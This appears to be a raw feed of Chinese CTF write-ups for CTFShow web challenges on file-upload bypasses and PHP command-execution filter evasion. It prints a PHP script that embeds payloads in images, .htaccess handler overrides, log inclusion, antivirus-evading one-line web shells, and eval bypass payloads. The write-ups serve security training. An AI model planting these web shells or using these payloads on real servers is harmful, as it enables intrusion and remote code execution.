class="hljs-literal">FALSE</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$m</span>)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>])) &#123;<br>                <span class="hljs-variable">$extraBytes</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>];<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataInputStream</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$binData</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$size</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$order</span> = <span class="hljs-literal">false</span>, <span class="hljs-variable">$fromString</span> = <span class="hljs-literal">false</span></span>) </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-string">&#x27;&#x27;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;order = <span class="hljs-variable">$order</span>;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fromString</span>) &#123;<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>) || !<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$filename</span>))<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;File not exists [&#x27;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&#x27;]&#x27;</span>);<br>                <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-variable">$filename</span>;<br>            &#125;<br>            <span class="hljs-variable language_">$this</span>-&gt;size = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">seek</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;size - <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData));<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">skip</span>(<span class="hljs-params"><span class="hljs-variable">$skip</span></span>) </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-variable">$skip</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readByte</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>()) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$byte</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$byte</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readShort</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData) &lt; <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$short</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">2</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;order) &#123;<br>                <span class="hljs-variable">$short</span> = (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$short</span> = (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$short</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eof</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> !<span class="hljs-variable language_">$this</span>-&gt;binData||(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData) === <span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br>用法  php exp.php a.png<br></code></pre></td></tr></table></figure><p>用群主提供的jpg二次渲染专用图片</p><p>先上传一遍 然后下载下来运行脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 在linux中运行</span><br>php exp.php a.jpg<br></code></pre></td></tr></table></figure><p>生成一个payload_a.jpg文件</p><p>再上传</p><p>post 1&#x3D;system(“tac flag.php”)；</p><p>这里用群主的图片试了n多次也没成功又找了一张成功了 </p><p>已经渲染过直接使用，不用跑脚本了</p><p><img src="/posts/fdac7c8/payload.jpg" alt="payload"></p><h2 id="Web166"><a href="#Web166" class="headerlink" title="Web166"></a>Web166</h2><p>只能上传zip文件</p><p><img src="/posts/fdac7c8/image-20220421213533539.png" alt="image-20220421213533539"></p><p>先上传然后更改内容 蚁剑连接 url为下载链接</p><h2 id="Web167"><a href="#Web167" class="headerlink" title="Web167"></a>Web167</h2><p>.htaccess绕过</p><p>先上传.htaccess文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;1.jpg&quot;</span>&gt;</span>  <br>        <span class="hljs-attribute">SetHandler</span> application/x-httpd-php  <br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure><p>然后上传1.jpg内容为一句话</p><p>蚁剑链接</p><p>其他方式</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">AddType application/x-httpd-php <span class="hljs-string">.jpg</span>   <span class="hljs-string">//</span>将<span class="hljs-string">.jpg</span>后缀的文件解析 成php<br></code></pre></td></tr></table></figure><p>如果flag不是php文件，那么还可以像.user.ini一样在当前目录加载一个文件</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">php_value</span> auto_append_file <span class="hljs-string">&#x27;flag&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="Web168"><a href="#Web168" class="headerlink" title="Web168"></a>Web168</h2><p>基础免杀可利用短标签进行命令执行</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;<span class="hljs-string">?=</span><span class="hljs-string">`tac ../flagaa.php`</span><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/posts/fdac7c8/image-20220421231200875.png" alt="image-20220421231200875"></p><p>访问xxx&#x2F;upload&#x2F;1.php</p><p>其他免杀姿势</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;s#y#s#t#e#m&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;#&quot;</span>,<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$b</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">$b</span>[<span class="hljs-number">1</span>].<span class="hljs-variable">$b</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">$b</span>[<span class="hljs-number">3</span>].<span class="hljs-variable">$b</span>[<span class="hljs-number">4</span>].<span class="hljs-variable">$b</span>[<span class="hljs-number">5</span>];<br><span class="hljs-variable">$c</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-string">&#x27;metsys&#x27;</span>);<br><span class="hljs-variable">$a</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-string">&#x27;1s&#x27;</span>,<span class="hljs-number">1</span>).<span class="hljs-string">&#x27;ystem&#x27;</span>;<br><span class="hljs-variable">$a</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="Web169"><a href="#Web169" class="headerlink" title="Web169"></a>Web169</h2><p>先在upload中上传一个index.php</p><p>内容为123</p><p><img src="/posts/fdac7c8/image-20220421232210882.png" alt="image-20220421232210882.png"></p><p>再上传一个.user.ini 包含日志文件</p><p><img src="/posts/fdac7c8/image-20220421233303438.png" alt="image-20220421233303438"></p><p>再ua中写入一句话</p><p>蚁剑连接 xxx&#x2F;upload</p><h2 id="Web170"><a href="#Web170" class="headerlink" title="Web170"></a>Web170</h2><p>同169</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.前端校验修改前端代码，或burp抓包<br>2.后端校验前端上传php,burp修改MIME<br>3.user.ini<br>4.文件魔术字节欺骗php过滤，采用简写<br>5.php骚操作<br>6.日志包含绕过<br>7.GlF89A绕过getimagesize<br>8.png图片二次渲染<br>9.jpg图片二次渲染<br>10.zip文件上传<br>11.apache解析漏洞<br>12.木马免杀</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFShow Web入门_命令执行</title>
    <link href="/posts/999021e8/"/>
    <url>/posts/999021e8/</url>
    
    <content type="html"><![CDATA[<p>命令执行绕过姿势：<a href="https://blog.csdn.net/qq_45836474/article/details/107248010">https://blog.csdn.net/qq_45836474/article/details/107248010</a></p><h2 id="Web29"><a href="#Web29" class="headerlink" title="Web29"></a>Web29</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到这里使用正则过滤了flag</p><p>绕过方法:<a href="https://www.cnblogs.com/zzjdbk/p/13491028.html">https://www.cnblogs.com/zzjdbk/p/13491028.html</a></p><p>可以使用重造变量的方法来读取flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?c=system($_GET[&#x27;a&#x27;]);&amp;a=cat flag.php;<br></code></pre></td></tr></table></figure><p>或者</p><p>使用双引号过滤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?c=echo `cat fl&#x27;&#x27;ag.php`;<br></code></pre></td></tr></table></figure><p>查看源代码拿到flag</p><h2 id="Web30"><a href="#Web30" class="headerlink" title="Web30"></a>Web30</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>这次过滤了flag，system，php</p><p>使用引号过滤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?c=echo `cat fl&#x27;&#x27;ag.p&#x27;&#x27;hp`;<br></code></pre></td></tr></table></figure><p>查看源代码拿到flag</p><h2 id="Web31"><a href="#Web31" class="headerlink" title="Web31"></a>Web31</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>这次过滤了<code> flag system php cat sort shell . 单引号和空格</code></p><p>这里用重造变量的方法</p><p>system不能用了换成eval</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">eval</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">参数a的system可以换成passthru()</span><br>?c=eval($_GET[&quot;a&quot;]);&amp;a=system(&#x27;cat flag.php&#x27;);<br></code></pre></td></tr></table></figure><p>其他payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment"># 用tac绕过对cat的过滤</span><br><span class="hljs-comment"># 用%09绕过对空格的过滤</span><br>?c=<span class="hljs-keyword">echo</span>`tac%<span class="hljs-number">09</span>fl*`;<br><br><span class="hljs-comment"># 用passthru绕过system的过滤</span><br><span class="hljs-comment"># tac饶过cat的过滤</span><br>?c=<span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-string">&quot;tac%09f*&quot;</span>);<br><br><span class="hljs-comment"># 下面这个没研究明白</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">array_reverse</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">pos</span>(<span class="hljs-title function_ invoke__">localeconv</span>())))));<br></code></pre></td></tr></table></figure><p>查看源代码拿到flag</p><h2 id="Web32"><a href="#Web32" class="headerlink" title="Web32"></a>Web32</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>这次比上一次多过滤了 反引号，分号，echo以及括号</p><p>对于;的过滤可以使用?&gt;来绕过 因为php的最后一条语句不需要分号</p><p>但是由于括号的过滤，只能使用一些不需要()的函数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">使用伪协议配合文件包含漏洞</span><br>?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p>php伪协议详解：<a href="https://segmentfault.com/a/1190000018991087#item-2">https://segmentfault.com/a/1190000018991087#item-2</a></p><p>得到一段base64 解密得到flag</p><h2 id="Web33"><a href="#Web33" class="headerlink" title="Web33"></a>Web33</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>这此过滤又加了一个双引号</p><p>还是可以使用伪协议绕过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p>base64解码得到flag</p><h2 id="Web34"><a href="#Web34" class="headerlink" title="Web34"></a>Web34</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>这次又加上了冒号但是他只对c的传参进行了过滤</p><p>还可以使用伪协议</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p>base64解码拿到flag</p><h2 id="Web35"><a href="#Web35" class="headerlink" title="Web35"></a>Web35</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>这次又多了\</p><p>但是还是只对c进行了过滤</p><p>使用伪协议过滤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p>base64解码拿到flag</p><h2 id="Web36"><a href="#Web36" class="headerlink" title="Web36"></a>Web36</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>这次多了&lt; &#x3D; 以及0-9的过滤</p><p>把伪协议payload中的1改为a</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p>base64解码拿到flag</p><h2 id="Web37"><a href="#Web37" class="headerlink" 